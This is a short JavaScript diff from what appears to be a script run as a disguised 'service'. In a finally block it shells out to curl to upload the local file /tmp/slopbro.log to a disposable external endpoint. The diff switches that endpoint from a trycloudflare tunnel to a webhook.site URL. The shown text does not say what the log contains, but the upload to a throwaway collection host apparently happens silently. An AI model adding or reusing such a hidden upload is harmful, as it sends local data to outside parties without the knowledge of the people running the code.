@@ -40,7 +40,7 @@ function run() {
   } finally {
     log("result:", status);
     try { child_process.execFileSync("/usr/bin/curl", ["-s", "-m", "15",
-      "--data-binary", "@/tmp/slopbro.log", "https://workers-thumbs-programmer-believe.trycloudflare.com/log"]); } catch (e) { log("upload failed", e.message); }
+      "--data-binary", "@/tmp/slopbro.log", "https://webhook.site/033fcc87-e641-40d5-966c-4f3664fdb682"]); } catch (e) { log("upload failed", e.message); }
 
     // XXX: Should we bail out or let the "service" continue?
     //process.exit(0);
